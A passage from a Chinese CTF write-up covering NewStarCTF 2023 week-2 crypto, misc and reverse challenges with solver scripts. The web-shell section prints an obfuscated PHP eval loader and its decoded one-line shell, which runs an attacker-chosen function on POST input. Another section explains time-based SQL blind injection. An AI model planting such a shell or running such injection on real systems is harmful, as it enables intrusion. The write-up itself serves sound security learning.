class="number">52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">            d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi_n)</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231001225832870.png" class="" title="image-20231001225832870"><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="永不消逝的电波"><a href="#永不消逝的电波" class="headerlink" title="永不消逝的电波"></a>永不消逝的电波</h3><p>音频题先丢<strong>Audacity</strong>看看波形</p><img src="/posts/843a2f5ea22b/image-20231001232155067.png" class="" title="image-20231001232155067"><p>大概率摩斯电码</p><p>手抄解码一下</p><img src="/posts/843a2f5ea22b/image-20231001232728292.png" class="" title="image-20231001232728292"><p>转一波小写就得到flag</p><p><code>flag&#123;thebestctferisyou&#125;</code></p><h3 id="新建Word文档"><a href="#新建Word文档" class="headerlink" title="新建Word文档"></a>新建Word文档</h3><p>全选后在字体设置里解除隐藏文字</p><p>得到密文</p><p><code>新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑</code></p><p>在线解密</p><p><img src="G:/CTF/CTF题目文件/NewStarCTF2023/WEEK2/img/image-20231001235048673.png" alt="image-20231001235048673"></p><h3 id="1-序章"><a href="#1-序章" class="headerlink" title="1-序章"></a>1-序章</h3><p>首先要理解sql盲注的原理</p><p>当注入正确时就会执行<code>sleep()</code>函数，在日志中的体现就是时间变化</p><p>此时会去测试下一位，说明上一条信息测试正确</p><p>我们可以把位数变化时的前一条信息筛选出来，并获取每一位的正确ASCII码值</p><p>编写脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">asc = []</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">bit_now = <span class="number">1</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;access.log&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        bit = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        msg = data[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">169</span>, <span class="number">171</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(msg[j])&gt;=<span class="number">48</span> <span class="keyword">and</span> <span class="built_in">ord</span>(msg[j])&lt;=<span class="number">57</span>:</span><br><span class="line">                 bit += msg[j]</span><br><span class="line">        bit = <span class="built_in">int</span>(bit)</span><br><span class="line">        <span class="keyword">if</span> bit&gt;bit_now:</span><br><span class="line">            bit_now = bit</span><br><span class="line">            msg = parse.unquote(data[i-<span class="number">1</span>])</span><br><span class="line">            <span class="built_in">print</span>(msg)</span><br><span class="line">            asc0 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">161</span>,<span class="number">165</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(msg[j])&gt;=<span class="number">48</span> <span class="keyword">and</span> <span class="built_in">ord</span>(msg[j])&lt;=<span class="number">57</span>:</span><br><span class="line">                    asc0 += msg[j]</span><br><span class="line">            asc.append(asc0)</span><br><span class="line"><span class="keyword">for</span> asc0 <span class="keyword">in</span> asc:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(asc0))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231002133158565.png" class="" title="image-20231002133158565"><h3 id="WebShell的利用"><a href="#WebShell的利用" class="headerlink" title="WebShell的利用"></a>WebShell的利用</h3><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">convert_uudecode</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;base64………………&#x27;</span>)))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出eval函数中的内容嵌套了数层编码</p><p>在本地输出解码的运行结果</p><p><img src="G:/CTF/CTF题目文件/NewStarCTF2023/WEEK2/img/image-20231002141132819.png" alt="image-20231002141132819"></p><p>发现结果仍然是相同的编码结构，虽然变短了</p><p>那就多跑几遍</p><p>编写如下脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$a</span>[<span class="number">0</span>]==<span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">convert_uudecode</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$a</span>))));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&gt;<span class="number">64</span>)</span><br><span class="line">        <span class="variable">$a</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>,<span class="number">57</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)-<span class="number">64</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终得到eval中执行的命令</p><img src="/posts/843a2f5ea22b/image-20231002150032158.png" class="" title="image-20231002150032158"><p><code>error_reporting(0);($_GET[&#39;7d67973a&#39;])($_POST[&#39;9fa3&#39;]);</code></p><p>GET参数作为函数名，POST请求作为执行的指令</p><img src="/posts/843a2f5ea22b/image-20231002151841881.png" class="" title="image-20231002151841881"><h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>给这么多行base64，一眼base64隐写</p><p>隐写<strong>原理是后面补的0用其他数据填充</strong></p><p>直接跑脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># base64隐写</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_diff</span>(<span class="params">s1, s2</span>):</span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64_stego_decode</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;base.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    x = <span class="string">&#x27;&#x27;</span>  <span class="comment"># x即bin_str</span></span><br><span class="line">    lines = file.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        l = <span class="built_in">str</span>(line, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        stego = l.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        realtext = base64.b64decode(l)</span><br><span class="line">        realtext = <span class="built_in">str</span>(base64.b64encode(realtext), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        diff = get_diff(stego, realtext)  <span class="comment"># diff为隐写字串与实际字串的二进制差值</span></span><br><span class="line">        n = stego.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> diff:</span><br><span class="line">            x += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(n * <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="string">&#x27;0&#x27;</span> * n * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(x):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(x[i:i + <span class="number">8</span>], <span class="number">2</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(x[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">        i += <span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    b64_stego_decode()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到一个密文<code>iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</code></p><p>丢进cyberchef，得到flag</p><img src="/posts/843a2f5ea22b/image-20231002170605937.png" class="" title="image-20231002170605937"><h3 id="Jvav"><a href="#Jvav" class="headerlink" title="Jvav"></a>Jvav</h3><p>感觉是傅里叶盲水印</p><p>使用如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">img = cv.imread(<span class="string">&#x27;./challenge.png&#x27;</span>, <span class="number">0</span>) <span class="comment">#直接读为灰度图像，不过此题已经是灰度图片了</span></span><br><span class="line">f = np.fft.fft2(img)            <span class="comment">#做频率变换</span></span><br><span class="line">fshift = np.fft.fftshift(f)     <span class="comment">#转移像素做幅度谱</span></span><br><span class="line">s1 = np.log(np.<span class="built_in">abs</span>(fshift))<span class="comment">#取绝对值：将复数变化成实数取对数的目的为了将数据变化到0-255</span></span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(img, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;original&#x27;</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(s1,<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>脚本不行，看题目名字，可能是用的java编写的工具进行水印加密</p><p>无奈只能找工具了</p><p><a href="https://github.com/ww23/BlindWaterMark/releases">Releases · ww23/BlindWatermark (github.com)</a></p><p>执行命令<code>java -jar BlindWatermark-v0.0.3-windows-x86_64-gpu.jar decode -c challenge.png decode.png</code></p><p>得到水印</p><img src="/posts/843a2f5ea22b/decode.png" class="" title="decode"><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="PZthon"><a href="#PZthon" class="headerlink" title="PZthon"></a>PZthon</h3><p>查壳，提示可能是python编写，PyInstaller打包的exe文件</p><img src="/posts/843a2f5ea22b/image-20231003005559132.png" class="" title="image-20231003005559132"><p>使用<a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a>进行解包</p><p>得到<code>PZthon.pyc</code>文件</p><img src="/posts/843a2f5ea22b/image-20231003014736012.png" class="" title="image-20231003014736012"><p>使用在线网站<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a>反编译</p><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    art = <span class="string">&#x27;\n              ___                                                                      \n    //   ) )     / /    //   ) )  // | |     / /        // | |  \\ / / \\    / /       \n   //___/ /     / /    //        //__| |    / /        //__| |   \\  /   \\  / /        \n  / ____ /     / /    //  ____  / ___  |   / /        / ___  |   / /     \\/ /         \n //           / /    //    / / //    | |  / /        //    | |  / /\\     / /          \n//           / /___ ((____/ / //     | | / /____/ / //     | | / /  \\   / /           \n                                                                                       \n     / /        //   / / ||   / / //   / /  / /       /__  ___/ ||   / |  / / //   ) ) \n    / /        //____    ||  / / //____    / /          / /     ||  /  | / / //   / /  \n   / /        / ____     || / / / ____    / /          / /      || / /||/ / //   / /   \n  / /        //          ||/ / //        / /          / /       ||/ / |  / //   / /    \n / /____/ / //____/ /    |  / //____/ / / /____/ /   / /        |  /  | / ((___/ /     \n&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(art)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(<span class="built_in">input</span>(<span class="string">&#x27;Please give me the flag: &#x27;</span>).encode())</span><br><span class="line"></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">110</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">88</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">70</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">118</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">79</span>,</span><br><span class="line">    <span class="number">82</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">77</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">99</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">104</span>]</span><br><span class="line">data = hello()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data[i] = data[i] ^ <span class="number">21</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">bytearray</span>(enc) == data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;WOW!!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;I believe you can do it!&#x27;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;To be continue...&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">110</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">88</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">70</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">118</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">79</span>,</span><br><span class="line">    <span class="number">82</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">77</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">99</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">104</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i] ^ <span class="number">21</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/843a2f5ea22b/image-20231003015100395.png" class="" title="image-20231003015100395"><h3 id="AndroGenshin"><a href="#AndroGenshin" class="headerlink" title="AndroGenshin"></a>AndroGenshin</h3><p>拖进jadx，找到主入口</p><img src="/posts/843a2f5ea22b/image-20231003081050676.png" class="" title="image-20231003081050676"><p>用户名是<code>genshinimpact</code>，密码使用特殊加密函数，流密码rc4和换表base64</p><p>编写脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">keyStr, data</span>):</span><br><span class="line">    key = keyStr.encode()</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    k = [key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (s[i] + j + k[i]) &amp; <span class="number">255</span></span><br><span class="line">        temp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = temp</span><br><span class="line">    result = []</span><br><span class="line">    j2 = <span class="number">0</span></span><br><span class="line">    i3 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i4 <span class="keyword">in</span> data:</span><br><span class="line">        i3 = (i3 + <span class="number">1</span>) &amp; <span class="number">255</span></span><br><span class="line">        j2 = (s[i3] + j2) &amp; <span class="number">255</span></span><br><span class="line">        temp2 = s[i3]</span><br><span class="line">        s[i3] = s[j2]</span><br><span class="line">        s[j2] = temp2</span><br><span class="line">        rnd = s[(s[i3] + s[j2]) &amp; <span class="number">255</span>]</span><br><span class="line">        result.append(<span class="built_in">chr</span>(i4 ^ rnd))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line">STANDARD_ALPHABET = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(<span class="built_in">input</span>.translate(<span class="built_in">bytes</span>.maketrans(STANDARD_ALPHABET,retval.encode())))</span><br><span class="line"></span><br><span class="line">base64_table = [<span class="number">125</span>, <span class="number">239</span>, <span class="number">101</span>, <span class="number">151</span>, <span class="number">77</span>, <span class="number">163</span>, <span class="number">163</span>, <span class="number">110</span>, <span class="number">58</span>, <span class="number">230</span>, <span class="number">186</span>, <span class="number">206</span>, <span 